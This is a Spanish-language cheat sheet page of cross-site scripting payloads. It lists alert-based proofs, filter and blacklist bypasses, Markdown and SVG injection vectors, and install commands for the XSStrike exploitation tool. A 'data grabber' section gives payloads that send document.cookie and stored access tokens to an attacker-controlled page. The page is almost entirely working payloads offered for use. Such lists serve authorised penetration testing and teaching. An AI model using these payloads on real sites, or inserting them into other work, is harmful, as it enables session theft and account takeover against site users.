
# XSS Payloads

## <mark style="color:purple;">XSS en Aplicaciones HTML</mark>

### Alerta Básica

```
<script>alert('XSS')</script>
```

<figure><img src="/files/0e3MiZvYOs7d4tC8Alit" alt=""><figcaption></figcaption></figure>

### Cookie PHPSESSID

```
<script>alert(document.cookie); </script>
```

<figure><img src="/files/1PljAtjy5xwOlQrxTt00" alt=""><figcaption></figcaption></figure>

### Bypass de alerta

```
"><script>alert(String.fromCharCode(88,83,83))</script>
```

<figure><img src="/files/nPeYWaZP658IBgorUIuB" alt=""><figcaption></figcaption></figure>

### Insertando una imagen fake

```
<img src=x onerror=alert('XSS');>
```

```
<img src=x onerror=alert('XSS')//
```

```
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

```
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
```

```
<img src=x:alert(alt) onerror=eval(src) alt=xss>
```

```
"><img src=x onerror=alert("XSS");>
```

```
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

<figure><img src="/files/6uMRml0TYsn8Vl5YcdRi" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">XSS en Markdown</mark>

```
[a](javascript:prompt(document.cookie))
```

```
[a](j a v a s c r i p t:prompt(document.cookie))
```

```
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

```
[a](javascript:window.onerror=alert;throw%201)
```

## <mark style="color:purple;">XSS en SVG</mark>

```
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
```

```
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

```
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
```

```
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

## <mark style="color:purple;">Bypass de blacklist con evaluación de código</mark>

```
eval('ale'+'rt(0)');
```

```
Function('ale'+'rt(1)')();
```

```
new Function`alert`6``;
```

```
setTimeout('ale'+'rt(2)');
```

```
setInterval('ale'+'rt(10)');
```

```
Set.constructor('ale'+'rt(13)')();
```

````
Set.constructor`alert(14)```;
````

## <mark style="color:purple;">XSStrike</mark>

Herramienta automática de explotación de Cross-Site Scripting:

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd home/kali/xsstrike
pip3 install -r requirements.txt
python3 xsstrike.py -h
```

## <mark style="color:purple;">Data grabber for XSS</mark>

Obtiene la cookie de administrador o el token de acceso confidencial, el siguiente payload lo enviará a una página controlada.

```
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
```

```
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
```

```
<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
```

```
<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
```

## <mark style="color:purple;">Hack Tools Plugin</mark>

<figure><img src="/files/N1z5W5BvlxRmEx4ojBge" alt=""><figcaption><p>Hack Tools PLugin</p></figcaption></figure>

{% embed url="<https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi?hl=es-419>" %}

En este plugin disponible para todos los navegadores, tenemos todos los comandos recogidos en esta página para hacer Cross Site Scripting.
